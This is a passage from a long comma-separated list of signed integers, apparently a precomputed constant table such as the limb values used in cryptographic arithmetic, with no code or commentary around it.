  -12796236,
  -12863944,
  -13219986,
  -8318266,
  -11018091,
  -6810145,
  -4843894,
  13475066,
  -3133972,
  32674895,
  13715045,
  11423335,
  -5468059,
  32344216,
  8962751,
  24989809,
  9241752,
  -13265253,
  16086212,
  -28740881,
  -15642093,
  -1409668,
  12530728,
  -6368726,
  10847387,
  19531186,
  -14132160,
  -11709148,
  7791794,
  -27245943,
  4383347,
  -28970898,
  5271447,
  -1266009,
  -9736989,
  -12455236,
  16732599,
  -4862407,
  -4906449,
  27193557,
  6245191,
  -15193956,
  5362278,
  -1783893,
  2695834,
  4960227,
  12840725,
  23061898,
  3260492,
  22510453,
  8577507,
  -12632451,
  11257346,
  -32692994,
  13548177,
  -721004,
  10879011,
  31168030,
  13952092,
  -29571492,
  -3635906,
  3877321,
  -9572739,
  32416692,
  5405324,
  -11004407,
  -13656635,
  3759769,
  11935320,
  5611860,
  8164018,
  -16275802,
  14667797,
  15906460,
  12155291,
  -22111149,
  -9039718,
  32003002,
  -8832289,
  5773085,
  -8422109,
  -23788118,
  -8254300,
  1950875,
  8937633,
  18686727,
  16459170,
  -905725,
  12376320,
  31632953,
  190926,
  -24593607,
  -16138885,
  -8423991,
  13378746,
  14162407,
  6901328,
  -8288749,
  4508564,
  -25341555,
  -3627528,
  8884438,
  -5884009,
  6023974,
  10104341,
  -6881569,
  -4941533,
  18722941,
  -14786005,
  -1672488,
  827625,
  -32720583,
  -16289296,
  -32503547,
  7101210,
  13354605,
  2659080,
  -1800575,
  -14108036,
  -24878478,
  1541286,
  2901347,
  -1117687,
  3880376,
  -10059388,
  -17620940,
  -3612781,
  -21802117,
  -3567481,
  20456845,
  -1885033,
  27019610,
  12299467,
  -13658288,
  -1603234,
  -12861660,
  -4861471,
  -19540150,
  -5016058,
  29439641,
  15138866,
  21536104,
  -6626420,
  -32447818,
  -10690208,
  -22408077,
  5175814,
  -5420040,
  -16361163,
  7779328,
  109896,
  30279744,
  14648750,
  -8044871,
  6425558,
  13639621,
  -743509,
  28698390,
  12180118,
  23177719,
  -554075,
  26572847,
  3405927,
  -31701700,
  12890905,
  -19265668,
  5335866,
  -6493768,
  2378492,
  4439158,
  -13279347,
  -22716706,
  3489070,
  -9225266,
  -332753,
  18875722,
  -1140095,
  14819434,
  -12731527,
  -17717757,
  -5461437,
  -5056483,
  16566551,
  15953661,
  3767752,
  -10436499,
  15627060,
  -820954,
  2177225,
  8550082,
  -15114165,
  -18473302,
  16596775,
  -381660,
  15663611,
  22860960,
  15585581,
  -27844109,
  -3582739,
  -23260460,
  -8428588,
  -32480551,
  15707275,
  -8205912,
  -5652081,
  29464558,
  2713815,
  -22725137,
  15860482,
  -21902570,
  1494193,
  -19562091,
  -14087393,
  -25583872,
  -9299552,
  13127842,
  759709,
  21923482,
  16529112,
  8742704,
  12967017,
  -28464899,
  1553205,
  32536856,
  -10473729,
  -24691605,
  -406174,
  -8914625,
  -2933896,
  -29903758,
  15553883,
  21877909,
  3230008,
  9881174,
  10539357,
  -4797115,
  2841332,
  11543572,
  14513274,
  19375923,
  -12647961,
  8832269,
  -14495485,
  13253511,
  5137575,
  5037871,
  4078777,
  24880818,
  -6222716,
  2862653,
  9455043,
  29306751,
  5123106,
  20245049,
  -14149889,
  9592566,
  8447059,
  -2077124,
  -2990080,
  15511449,
  4789663,
  -20679756,
  7004547,
  8824831,
  -9434977,
  -4045704,
  -3750736,
  -5754762,
  108893,
  23513200,
  16652362,
  -33256173,
  4144782,
  -4476029,
  -6579123,
  10770039,
  -7155542,
  -6650416,
  -12936300,
  -18319198,
  10212860,
  2756081,
  8598110,
  7383731,
  -6859892,
  22312759,
  -1105012,
  21179801,
  2600940,
  -9988298,
  -12506466,
  -24645692,
  13317462,
  -30449259,
  -15653928,
  21365574,
  -10869657,
  11344424,
  864440,
  -2499677,
  -16710063,
  -26432803,
  6148329,
  -17184412,
  -14474154,
  18782929,
  -275997,
  -22561534,
  211300,
  2719757,
  4940997,
  -1323882,
  3911313,
  -6948744,
  14759765,
  -30027150,
  7851207,
  21690126,
  8518463,
  26699843,
  5276295,
  -13149873,
  -6429067,
  9396249,
  365013,
  24703301,
  -10488939,
  1321586,
  149635,
  -15452774,
  7159369,
  9987780,
  -3404759,
  17507962,
  9505530,
  9731535,
  -2165514,
  22356009,
  8312176,
  22477218,
  -8403385,
  18155857,
  -16504990,
  19744716,
  9006923,
  15154154,
  -10538976,
  24256460,
  -4864995,
  -22548173,
  9334109,
  2986088,
  -4911893,
  10776628,
  -3473844,
  10620590,
  -7083203,
  -21413845,
  14253545,
  -22587149,
  536906,
  4377756,
  8115836,
  24567078,
  15495314,
  11625074,
  13064599,
  7390551,
  10589625,
  10838060,
  -15420424,
  -19342404,
  867880,
  9277171,
  -3218459,
  -14431572,
  -1986443,
  19295826,
  -15796950,
  6378260,
  699185,
  7895026,
  4057113,
  -7081772,
  -13077756,
  -17886831,
  -323126,
  -716039,
  15693155,
  -5045064,
  -13373962,
  -7737563,
  -5869402,
  -14566319,
  -7406919,
  11385654,
  13201616,
  31730678,
  -10962840,
  -3918636,
  -9669325,
  10188286,
  -15770834,
  -7336361,
  13427543,
  22223443,
  14896287,
  30743455,
  7116568,
  -21786507,
  5427593,
  696102,
  13206899,
  27047647,
  -10632082,
  15285305,
  -9853179,
  10798490,
  -4578720,
  19236243,
  12477404,
  -11229439,
  11243796,
  -17054270,
  -8040865,
  -788228,
  -8167967,
  -3897669,
  11180504,
  -23169516,
  7733644,
  17800790,
  -14036179,
  -27000429,
  -11766671,
  23887827,
  3149671,
  23466177,
  -10538171,
  10322027,
  15313801,
  26246234,
  11968874,
  32263343,
  -5468728,
  6830755,
  -13323031,
  -15794704,
  -101982,
  -24449242,
  10890804,
  -31365647,
  10271363,
  -12660625,
  -6267268,
  16690207,
  -13062544,
  -14982212,
  16484931,
  25180797,
  -5334884,
  -586574,
  10376444,
  -32586414,
  -11286356,
  19801893,
  10997610,
  2276632,
  9482883,
  316878,
  13820577,
  -9882808,
  -4510367,
  -2115506,
  16457136,
  -11100081,
  11674996,
  30756178,
  -7515054,
  30696930,
  -3712849,
  32988917,
  -9603412,
  12499366,
  7910787,
  -10617257,
  -11931514,
  -7342816,
  -9985397,
  -32349517,
  7392473,
  -8855661,
  15927861,
  9866406,
  -3649411,
  -2396914,
  -16655781,
  -30409476,
  -9134995,
  25112947,
  -2926644,
  -2504044,
  -436966,
  25621774,
  -5678772,
  15085042,
  -5479877,
  -24884878,
  -13526194,
  5537438,
  -13914319,
  -11225584,
  2320285,
  -9584280,
  10149187,
  -33444663,
  5808648,
  -14876251,
  -1729667,
  31234590,
  6090599,
  -9633316,
  116426,
  26083934,
  2897444,
  -6364437,
  -2688086,
  609721,
  15878753,
  -6970405,
  -9034768,
  -27757857,
  247744,
  -15194774,
  -9002551,
  23288161,
  -10011936,
  -23869595,
  6503646,
  20650474,
  1804084,
  -27589786,
  15456424,
  8972517,
  8469608,
  15640622,
  4439847,
  3121995,
  -10329713,
  27842616,
  -202328,
  -15306973,
  2839644,
  22530074,
  10026331,
  4602058,
  5048462,
  28248656,
  5031932,
  -11375082,
  12714369,
  20807691,
  -7270825,
  29286141,
  11421711,
  -27876523,
  -13868230,
  -21227475,
  1035546,
  -19733229,
  12796920,
  12076899,
  -14301286,
  -8785001,
  -11848922,
  -25012791,
  16400684,
  -17591495,
  -12899438,
  3480665,
  -15182815,
  -32361549,
  5457597,
  28548107,
  7833186,
  7303070,
  -11953545,
  -24363064,
  -15921875,
  -33374054,
  2771025,
  -21389266,
  421932,
  26597266,
  6860826,
  22486084,
  -6737172,
  -17137485,
  -4210226,
  -24552282,
  15673397,
  -20184622,
  2338216,
  19788685,
  -9620956,
  -4001265,
  -8740893,
  -20271184,
  4733254,
  3727144,
  -12934448,
  6120119,
  814863,
  -11794402,
  -622716,
  6812205,
  -15747771,
  2019594,
  7975683,
  31123697,
  -10958981,
  30069250,
  -11435332,
  30434654,
  2958439,
  18399564,
  -976289,
  12296869,
  9204260,
  -16432438,
  9648165,
  32705432,
  -1550977,
  30705658,
  7451065,
  -11805606,
  9631813,
  3305266,
  5248604,
  -26008332,
  -11377501,
  17219865,
  2375039,
  -31570947,
  -5575615,
  -19459679,
  9219903,
  294711,
  15298639,
  2662509,
  -16297073,
  -1172927,
  -7558695,
  -4366770,
  -4287744,
  -21346413,
  -8434326,
  32087529,
  -1222777,
  32247248,
  -14389861,
  14312628,
  1221556,
  17395390,
  -8700143,
  -4945741,
  -8684635,
  -28197744,
  -9637817,
  -16027623,
  -13378845,
  -1428825,
  -9678990,
  -9235681,
  6549687,
  -7383069,
  -468664,
  23046502,
  9803137,
  17597934,
  2346211,
  18510800,
  15337574,
  26171504,
  981392,
  -22241552,
  7827556,
  -23491134,
  -11323352,
  3059833,
  -11782870,
  10141598,
  6082907,
  17829293,
  -1947643,
  9830092,
  13613136,
  -25556636,
  -5544586,
  -33502212,
  3592096,
  33114168,
  -15889352,
  -26525686,
  -13343397,
  33076705,
  8716171,
  1151462,
  1521897,
  -982665,
  -6837803,
  -32939165,
  -4255815,
  23947181,
  -324178,
  -33072974,
  -12305637,
  -16637686,
  3891704,
  26353178,
  693168,
  30374239,
  1595580,
  -16884039,
  13186931,
  4600344,
  406904,
  9585294,
  -400668,
  31375464,
  14369965,
  -14370654,
  -7772529,
  1510301,
  6434173,
  -18784789,
  -6262728,
  32732230,
  -13108839,
  17901441,
  16011505,
  18171223,
  -11934626,
  -12500402,
  15197122,
  -11038147,
  -15230035,
  -19172240,
  -16046376,
  8764035,
  12309598,
  5975908,
  -5243188,
  -19459362,
  -9681747,
  -11541277,
  14015782,
  -23665757,
  1228319,
  17544096,
  -10593782,
  5811932,
  -1715293,
  3442887,
  -2269310,
  -18367348,
  -8359541,
  -18044043,
  -15410127,
  -5565381,
  12348900,
  -31399660,
  11407555,
  25755363,
  6891399,
  -3256938,
  14872274,
  -24849353,
  8141295,
  -10632534,
  -585479,
  -12675304,
  694026,
  -5076145,
  13300344,
  14015258,
  -14451394,
  -9698672,
  -11329050,
  30944593,
  1130208,
  8247766,
  -6710942,
  -26562381,
  -7709309,
  -14401939,
  -14648910,
  4652152,
  2488540,
  23550156,
  -271232,
  17294316,
  -3788438,
  7026748,
  15626851,
  22990044,
  113481,
  2267737,
  -5908146,
  -408818,
  -137719,
  16091085,
  -16253926,
  18599252,
  7340678,
  2137637,
  -1221657,
  -3364161,
  14550936,
  3260525,
  -7166271,
  -4910104,
  -13332887,
  18550887,
  10864893,
  -16459325,
  -7291596,
  -23028869,
  -13204905,
  -12748722,
  2701326,
  -8574695,
  16099415,
  4629974,
  -16340524,
  -20786213,
  -6005432,
  -10018363,
  9276971,
  11329923,
  1862132,
  14763076,
  -15903608,
  -30918270,
  3689867,
  3511892,
  10313526,
  -21951088,
  12219231,
  -9037963,
  -940300,
  8894987,
  -3446094,
  6150753,
  3013931,
  301220,
  15693451,
  -31981216,
  -2909717,
  -15438168,
  11595570,
  15214962,
  3537601,
  -26238722,
  -14058872,
  4418657,
  -15230761,
  13947276,
  10730794,
  -13489462,
  -4363670,
  -2538306,
  7682793,
  32759013,
  263109,
  -29984731,
  -7955452,
  -22332124,
  -10188635,
  977108,
  699994,
  -12466472,
  4195084,
  -9211532,
  550904,
  -15565337,
  12917920,
  19118110,
  -439841,
  -30534533,
  -14337913,
  31788461,
  -14507657,
  4799989,
  7372237,
  8808585,
  -14747943,
  9408237,
  -10051775,
  12493932,
  -5409317,
  -25680606,
  5260744,
  -19235809,
  -6284470,
  -3695942,
  16566087,
  27218280,
  2607121,
  29375955,
  6024730,
  842132,
  -2794693,
  -4763381,
  -8722815,
  26332018,
  -12405641,
  11831880,
  6985184,
  -9940361,
  2854096,
  -4847262,
  -7969331,
  2516242,
  -5847713,
  9695691,
  -7221186,
  16512645,
  960770,
  12121869,
  16648078,
  -15218652,
  14667096,
  -13336229,
  2013717,
  30598287,
  -464137,
  -31504922,
  -7882064,
  20237806,
  2838411,
  -19288047,
  4453152,
  15298546,
  -16178388,
  22115043,
  -15972604,
  12544294,
  -13470457,
  1068881,
  -12499905,
  -9558883,
  -16518835,
  33238498,
  13506958,
  30505848,
  -1114596,
  -8486907,
  -2630053,
  12521378,
  4845654,
  -28198521,
  10744108,
  -2958380,
  10199664,
  7759311,
  -13088600,
  3409348,
  -873400,
  -6482306,
  -12885870,
  -23561822,
  6230156,
  -20382013,
  10655314,
  -24040585,
  -11621172,
  10477734,
  -1240216,
  -3113227,
  13974498,
  12966261,
  15550616,
  -32038948,
  -1615346,
  21025980,
  -629444,
  5642325,
  7188737,
  18895762,
  12629579,
  14741879,
  -14946887,
  22177208,
  -11721237,
  1279741,
  8058600,
  11758140,
  789443,
  32195181,
  3895677,
  10758205,
  15755439,
  -4509950,
  9243698,
  -4879422,
  6879879,
  -2204575,
  -3566119,
  -8982069,
  4429647,
  -2453894,
  15725973,
  -20436342,
  -10410672,
  -5803908,
  -11040220,
  -7135870,
  -11642895,
  18047436,
  -15281743,
  -25173001,
  -11307165,
  29759956,
  11776784,
  -22262383,
  -15820455,
  10993114,
  -12850837,
  -17620701,
  -9408468,
  21987233,
  700364,
  -24505048,
  14972008,
  -7774265,
  -5718395,
  32155026,
  2581431,
  -29958985,
  8773375,
  -25568350,
  454463,
  -13211935,
  16126715,
  25240068,
  8594567,
  20656846,
  12017935,
  -7874389,
  -13920155,
  6028182,
  6263078,
  -31011806,
  -11301710,
  -818919,
  2461772,
  -31841174,
  -5468042,
  -1721788,
  -2776725,
  -12278994,
  16624277,
  987579,
  -5922598,
  32908203,
  1248608,
  7719845,
  -4166698,
  28408820,
  6816612,
  -10358094,
  -8237829,
  19549651,
  -12169222,
  22082623,
  16147817,
  20613181,
  13982702,
  -10339570,
  5067943,
  -30505967,
  -3821767,
  12074681,
  13582412,
  -19877972,
  2443951,
  -19719286,
  12746132,
  5331210,
  -10105944,
  30528811,
  3601899,
  -1957090,
  4619785,
  -27361822,
  -15436388,
  24180793,
  -12570394,
  27679908,
  -1648928,
  9402404,
  -13957065,
  32834043,
  10838634,
  -26580150,
  -13237195,
  26653274,
  -8685565,
  22611444,
  -12715406,
  22190590,
  1118029,
  22736441,
  15130463,
  -30460692,
  -5991321,
  19189625,
  -4648942,
  4854859,
  6622139,
  -8310738,
  -2953450,
  -8262579,
  -3388049,
  -10401731,
  -271929,
  13424426,
  -3567227,
  26404409,
  13001963,
  -31241838,
  -15415700,
  -2994250,
  8939346,
  11562230,
  -12840670,
  -26064365,
  -11621720,
  -15405155,
  11020693,
  1866042,
  -7949489,
  -7898649,
  -10301010,
  12483315,
  13477547,
  3175636,
  -12424163,
  28761762,
  1406734,
  -448555,
  -1777666,
  13018551,
  3194501,
  -9580420,
  -11161737,
  24760585,
  -4347088,
  25577411,
  -13378680,
  -24290378,
  4759345,
  -690653,
  -1852816,
  2066747,
  10693769,
  -29595790,
  9884936,
  -9368926,
  4745410,
  -9141284,
  6049714,
  -19531061,
  -4341411,
  -31260798,
  9944276,
  -15462008,
  -11311852,
  10931924,
  -11931931,
  -16561513,
  14112680,
  -8012645,
  4817318,
  -8040464,
  -11414606,
  -22853429,
  10856641,
  -20470770,
  13434654,
  22759489,
  -10073434,
  -16766264,
  -1871422,
  13637442,
  -10168091,
  1765144,
  -12654326,
  28445307,
  -5364710,
  29875063,
  12493613,
  2795536,
  -3786330,
  1710620,
  15181182,
  -10195717,
  -8788675,
  9074234,
  1167180,
  -26205683,
  11014233,
  -9842651,
  -2635485,
  -26908120,
  7532294,
  -18716888,
  -9535498,
  3843903,
  9367684,
  -10969595,
  -6403711,
  9591134,
  9582310,
  11349256,
  108879,
  16235123,
  8601684,
  -139197,
  4242895,
  22092954,
  -13191123,
  -2042793,
  -11968512,
  32186753,
  -11517388,
  -6574341,
  2470660,
  -27417366,
  16625501,
  -11057722,
  3042016,
  13770083,
  -9257922,
  584236,
  -544855,
  -7770857,
  2602725,
  -27351616,
  14247413,
  6314175,
  -10264892,
  -32772502,
  15957557,
  -10157730,
  168750,
  -8618807,
  14290061,
  27108877,
  -1180880,
  -8586597,
  -7170966,
  13241782,
  10960156,
  -32991015,
  -13794596,
  33547976,
  -11058889,
  -27148451,
  981874,
  22833440,
  9293594,
  -32649448,
  -13618667,
  -9136966,
  14756819,
  -22928859,
  -13970780,
  -10479804,
  -16197962,
  -7768587,
  3326786,
  -28111797,
  10783824,
  19178761,
  14905060,
  22680049,
  13906969,
  -15933690,
  3797899,
  21721356,
  -4212746,
  -12206123,
  9310182,
  -3882239,
  -13653110,
  23740224,
  -2709232,
  20491983,
  -8042152,
  9209270,
  -15135055,
  -13256557,
  -6167798,
  -731016,
  15289673,
  25947805,
  15286587,
  30997318,
  -6703063,
  7392032,
  16618386,
  23946583,
  -8039892,
  -13265164,
  -1533858,
  -14197445,
  -2321576,
  17649998,
  -250080,
  -9301088,
  -14193827,
  30609526,
  -3049543,
  -25175069,
  -1283752,
  -15241566,
  -9525724,
  -2233253,
  7662146,
  -17558673,
  1763594,
  -33114336,
  15908610,
  -30040870,
  -12174295,
  7335080,
  -8472199,
  -3174674,
  3440183,
  -19889700,
  -5977008,
  -24111293,
  -9688870,
  10799743,
  -16571957,
  40450,
  -4431835,
  4862400,
  1133,
  -32856209,
  -7873957,
  -5422389,
  14860950,
  -16319031,
  7956142,
  7258061,
  311861,
  -30594991,
  -7379421,
  -3773428,
  -1565936,
  28985340,
  7499440,
  24445838,
  9325937,
  29727763,
  16527196,
  18278453,
  15405622,
  -4381906,
  8508652,
  -19898366,
  -3674424,
  -5984453,
  15149970,
  -13313598,
  843523,
  -21875062,
  13626197,
  2281448,
  -13487055,
  -10915418,
  -2609910,
  1879358,
  16164207,
  -10783882,
  3953792,
  13340839,
  15928663,
  31727126,
  -7179855,
  -18437503,
  -8283652,
  2875793,
  -16390330,
  -25269894,
  -7014826,
  -23452306,
  5964753,
  4100420,
  -5959452,
  -17179337,
  6017714,
  -18705837,
  12227141,
  -26684835,
  11344144,
  2538215,
  -7570755,
  -9433605,
  6123113,
  11159803,
  -2156608,
  30016280,
  14966241,
  -20474983,
  1485421,
  -629256,
  -15958862,
  -26804558,
  4260919,
  11851389,
  9658551,
  -32017107,
  16367492,
  -20205425,
  -13191288,
  11659922,
  -11115118,
  26180396,
  10015009,
  -30844224,
  -8581293,
  5418197,
  9480663,
  2231568,
  -10170080,
  33100372,
  -1306171,
  15121113,
  -5201871,
  -10389905,
  15427821,
  -27509937,
  -15992507,
  21670947,
  4486675,
  -5931810,
  -14466380,
  16166486,
  -9483733,
  -11104130,
  6023908,
  -31926798,
  -1364923,
  2340060,
  -16254968,
  -10735770,
  -10039824,
  28042865,
  -3557089,
  -12126526,
  12259706,
  -3717498,
  -6945899,
  6766453,
  -8689599,
  18036436,
  5803270,
  -817581,
  6763912,
  11803561,
  1585585,
  10958447,
  -2671165,
  23855391,
  4598332,
  -6159431,
  -14117438,
  -31031306,
  -14256194,
  17332029,
  -2383520,
  31312682,
  -5967183,
  696309,
  50292,
  -20095739,
  11763584,
  -594563,
  -2514283,
  -32234153,
  12643980,
  12650761,
  14811489,
  665117,
  -12613632,
  -19773211,
  -10713562,
  30464590,
  -11262872,
  -4127476,
  -12734478,
  19835327,
  -7105613,
  -24396175,
  2075773,
  -17020157,
  992471,
  18357185,
  -6994433,
  7766382,
  16342475,
  -29324918,
  411174,
  14578841,
  8080033,
  -11574335,
  -10601610,
  19598397,
  10334610,
  12555054,
  2555664,
  18821899,
  -10339780,
  21873263,
  16014234,
  26224780,
  16452269,
  -30223925,
  5145196,
  5944548,
  16385966,
  3976735,
  2009897,
  -11377804,
  -7618186,
  -20533829,
  3698650,
  14187449,
  3448569,
  -10636236,
  -10810935,
  -22663880,
  -3433596,
  7268410,
  -10890444,
  27394301,
  12015369,
  19695761,
  16087646,
  28032085,
  12999827,
  6817792,
  11427614,
  20244189,
  -1312777,
  -13259127,
  -3402461,
  30860103,
  12735208,
  -1888245,
  -4699734,
  -16974906,
  2256940,
  -8166013,
  12298312,
  -8550524,
  -10393462,
  -5719826,
  -11245325,
  -1910649,
  15569035,
  26642876,
  -7587760,
  -5789354,
  -15118654,
  -4976164,
  12651793,
  -2848395,
  9953421,
  11531313,
  -5282879,
  26895123,
  -12697089,
  -13118820,
  -16517902,
  9768698,
  -2533218,
  -24719459,
  1894651,
  -287698,
  -4704085,
  15348719,
  -8156530,
  32767513,
  12765450,
  4940095,
  10678226,
  18860224,
  15980149,
  -18987240,
  -1562570,
  -26233012,
  -11071856,
  -7843882,
  13944024,
  -24372348,
  16582019,
  -15504260,
  4970268,
  -29893044,
  4175593,
  -20993212,
  -2199756,
  -11704054,
  15444560,
  -11003761,
  7989037,
  31490452,
  5568061,
  -2412803,
  2182383,
  -32336847,
  4531686,
  -32078269,
  6200206,
  -19686113,
  -14800171,
  -17308668,
  -15879940,
  -31522777,
  -2831,
  -32887382,
  16375549,
  8680158,
  -16371713,
  28550068,
  -6857132,
  -28126887,
  -5688091,
  16837845,
  -1820458,
  -6850681,
  12700016,
  -30039981,
  4364038,
  1155602,
  5988841,
  21890435,
  -13272907,
  -12624011,
  12154349,
  -7831873,
  15300496,
  23148983,
  -4470481,
  24618407,
  8283181,
  -33136107,
  -10512751,
  9975416,
  6841041,
  -31559793,
  16356536,
  3070187,
  -7025928,
  1466169,
  10740210,
  -1509399,
  -15488185,
  -13503385,
  -10655916,
  32799044,
  909394,
  -13938903,
  -5779719,
  -32164649,
  -15327040,
  3960823,
  -14267803,
  -28026090,
  -15918051,
  -19404858,
  13146868,
  15567327,
  951507,
  -3260321,
  -573935,
  24740841,
  5052253,
  -30094131,
  8961361,
  25877428,
  6165135,
  -24368180,
  14397372,
  -7380369,
  -6144105,
  -28888365,
  3510803,
  -28103278,
  -1158478,
  -11238128,
  -10631454,
  -15441463,
  -14453128,
  -1625486,
  -6494814,
  793299,
  -9230478,
  8836302,
  -6235707,
  -27360908,
  -2369593,
  33152843,
  -4885251,
  -9906200,
  -621852,
  5666233,
  525582,
  20782575,
  -8038419,
  -24538499,
  14657740,
  16099374,
  1468826,
  -6171428,
  -15186581,
  -4859255,
  -3779343,
  -2917758,
  -6748019,
  7778750,
  11688288,
  -30404353,
  -9871238,
  -1558923,
  -9863646,
  10896332,
  -7719704,
  824275,
  472601,
  -19460308,
  3009587,
  25248958,
  14783338,
  -30581476,
  -15757844,
  10566929,
  12612572,
  -31944212,
  11118703,
  -12633376,
  12362879,
  21752402,
  8822496,
  24003793,
  14264025,
  27713862,
  -7355973,
  -11008240,
  9227530,
  27050101,
  2504721,
  23886875,
  -13117525,
  13958495,
  -5732453,
  -23481610,
  4867226,
  -27247128,
  3900521,
  29838369,
  -8212291,
  -31889399,
  -10041781,
  7340521,
  -15410068,
  4646514,
  -8011124,
  -22766023,
  -11532654,
  23184553,
  8566613,
  31366726,
  -1381061,
  -15066784,
  -10375192,
  -17270517,
  12723032,
  -16993061,
  14878794,
  21619651,
  -6197576,
  27584817,
  3093888,
  -8843694,
  3849921,
  -9064912,
  2103172,
  25561640,
  -15125738,
  -5239824,
  9582958,
  32477045,
  -9017955,
  5002294,
  -15550259,
  -12057553,
  -11177906,
  21115585,
  -13365155,
  8808712,
  -12030708,
  16489530,
  13378448,
  -25845716,
  12741426,
  -5946367,
  10645103,
  -30911586,
  15390284,
  -3286982,
  -7118677,
  24306472,
  15852464,
  28834118,
  -7646072,
  -17335748,
  -9107057,
  -24531279,
  9434953,
  -8472084,
  -583362,
  -13090771,
  455841,
  20461858,
  5491305,
  13669248,
  -16095482,
  -12481974,
  -10203039,
  -14569770,
  -11893198,
  -24995986,
  11293807,
  -28588204,
  -9421832,
  28497928,
  6272777,
  -33022994,
  14470570,
  8906179,
  -1225630,
  18504674,
  -14165166,
  29867745,
  -8795943,
  -16207023,
  13517196,
  -27799630,
  -13697798,
  24009064,
  -6373891,
  -6367600,
  -13175392,
  22853429,
  -4012011,
  24191378,
  16712145,
  -13931797,
  15217831,
  14542237,
  1646131,
  18603514,
  -11037887,
  12876623,
  -2112447,
  17902668,
  4518229,
  -411702,
  -2829247,
  26878217,
  5258055,
  -12860753,
  608397,
  16031844,
  3723494,
  -28632773,
  12763728,
  -20446446,
  7577504,
  33001348,
  -13017745,
  17558842,
  -7872890,
  23896954,
  -4314245,
  -20005381,
  -12011952,
  31520464,
  605201,
  2543521,
  5991821,
  -2945064,
  7229064,
  -9919646,
  -8826859,
  28816045,
  298879,
  -28165016,
  -15920938,
  19000928,
  -1665890,
  -12680833,
  -2949325,
  -18051778,
  -2082915,
  16000882,
  -344896,
  3493092,
  -11447198,
  -29504595,
  -13159789,
  12577740,
  16041268,
  -19715240,
  7847707,
  10151868,
  10572098,
  27312476,
  7922682,
  14825339,
  4723128,
  -32855931,
  -6519018,
  -10020567,
  3852848,
  -11430470,
  15697596,
  -21121557,
  -4420647,
  5386314,
  15063598,
  16514493,
  -15932110,
  29330899,
  -15076224,
  -25499735,
  -4378794,
  -15222908,
  -6901211,
  16615731,
  2051784,
  3303702,
  15490,
  -27548796,
  12314391,
  15683520,
  -6003043,
  18109120,
  -9980648,
  15337968,
  -5997823,
  -16717435,
  15921866,
  16103996,
  -3731215,
  -23169824,
  -10781249,
  13588192,
  -1628807,
  -3798557,
  -1074929,
  -19273607,
  5402699,
  -29815713,
  -9841101,
  23190676,
  2384583,
  -32714340,
  3462154,
  -29903655,
  -1529132,
  -11266856,
  8911517,
  -25205859,
  2739713,
  21374101,
  -3554250,
  -33524649,
  9874411,
  15377179,
  11831242,
  -33529904,
  6134907,
  4931255,
  11987849,
  -7732,
  -2978858,
  -16223486,
  7277597,
  105524,
  -322051,
  -31480539,
  13861388,
  -30076310,
  10117930,
  -29501170,
  -10744872,
  -26163768,
  13051539,
  -25625564,
  5089643,
  -6325503,
  6704079,
  12890019,
  15728940,
  -21972360,
  -11771379,
  -951059,
  -4418840,
  14704840,
  2695116,
  903376,
  -10428139,
  12885167,
  8311031,
  -17516482,
  5352194,
  10384213,
  -13811658,
  7506451,
  13453191,
  26423267,
  4384730,
  1888765,
  -5435404,
  -25817338,
  -3107312,
  -13494599,
  -3182506,
  30896459,
  -13921729,
  -32251644,
  -12707869,
  -19464434,
  -3340243,
  -23607977,
  -2665774,
  -526091,
  4651136,
  5765089,
  4618330,
  6092245,
  14845197,
  17151279,
  -9854116,
  -24830458,
  -12733720,
  -15165978,
  10367250,
  -29530908,
  -265356,
  22825805,
  -7087279,
  -16866484,
  16176525,
  -23583256,
  6564961,
  20063689,
  3798228,
  -4740178,
  7359225,
  2006182,
  -10363426,
  -28746253,
  -10197509,
  -10626600,
  -4486402,
  -13320562,
  -5125317,
  3432136,
  -6393229,
  23632037,
  -1940610,
  32808310,
  1099883,
  15030977,
  5768825,
  -27451236,
  -2887299,
  -6427378,
  -15361371,
  -15277896,
  -6809350,
  2051441,
  -15225865,
  -3362323,
  -7239372,
  7517890,
  9824992,
  23555850,
  295369,
  5148398,
  -14154188,
  -22686354,
  16633660,
  4577086,
  -16752288,
  13249841,
  -15304328,
  19958763,
  -14537274,
  18559670,
  -10759549,
  8402478,
  -9864273,
  -28406330,
  -1051581,
  -26790155,
  -907698,
  -17212414,
  -11030789,
  9453451,
  -14980072,
  17983010,
  9967138,
  -25762494,
  6524722,
  26585488,
  9969270,
  24709298,
  1220360,
  -1677990,
  7806337,
  17507396,
  3651560,
  -10420457,
  -4118111,
  14584639,
  15971087,
  -15768321,
  8861010,
  26556809,
  -5574557,
  -18553322,
  -11357135,
  2839101,
  14284142,
  4029895,
  3472686,
  14402957,
  12689363,
  -26642121,
  8459447,
  -5605463,
  -7621941,
  -4839289,
  -3535444,
  9744961,
  2871048,
  25113978,
  3187018,
  -25110813,
  -849066,
  17258084,
  -7977739,
  18164541,
  -10595176,
  -17154882,
  -1542417,
  19237078,
  -9745295,
  23357533,
  -15217008,
  26908270,
  12150756,
  -30264870,
  -7647865,
  5112249,
  -7036672,
  -1499807,
  -6974257,
  43168,
  -5537701,
  -32302074,
  16215819,
  -6898905,
  9824394,
  -12304779,
  -4401089,
  -31397141,
  -6276835,
  32574489,
  12532905,
  -7503072,
  -8675347,
  -27343522,
  -16515468,
  -27151524,
  -10722951,
  946346,
  16291093,
  254968,
  7168080,
  21676107,
  -1943028,
  21260961,
  -8424752,
  -16831886,
  -11920822,
  -23677961,
  3968121,
  -3651949,
  -6215466,
  -3556191,
  -7913075,
  16544754,
  13250366,
  -16804428,
  15546242,
  -4583003,
  12757258,
  -2462308,
  -8680336,
  -18907032,
  -9662799,
  -2415239,
  -15577728,
  18312303,
  4964443,
  -15272530,
  -12653564,
  26820651,
  16690659,
  25459437,
  -4564609,
  -25144690,
  11425020,
  28423002,
  -11020557,
  -6144921,
  -15826224,
  9142795,
  -2391602,
  -6432418,
  -1644817,
  -23104652,
  6253476,
  16964147,
  -3768872,
  -25113972,
  -12296437,
  -27457225,
  -16344658,
  6335692,
  7249989,
  -30333227,
  13979675,
  7503222,
  -12368314,
  -11956721,
  -4621693,
  -30272269,
  2682242,
  25993170,
  -12478523,
  4364628,
  5930691,
  32304656,
  -10044554,
  -8054781,
  15091131,
  22857016,
  -10598955,
  31820368,
  15075278,
  31879134,
  -8918693,
  17258761,
  90626,
  -8041836,
  -4917709,
  24162788,
  -9650886,
  -17970238,
  12833045,
  19073683,
  14851414,
  -24403169,
  -11860168,
  7625278,
  11091125,
  -19619190,
  2074449,
  -9413939,
  14905377,
  24483667,
  -11935567,
  -2518866,
  -11547418,
  -1553130,
  15355506,
  -25282080,
  9253129,
  27628530,
  -7555480,
  17597607,
  8340603,
  19355617,
  552187,
  26198470,
  -3176583,
  4593324,
  -9157582,
  -14110875,
  15297016,
  510886,
  14337390,
  -31785257,
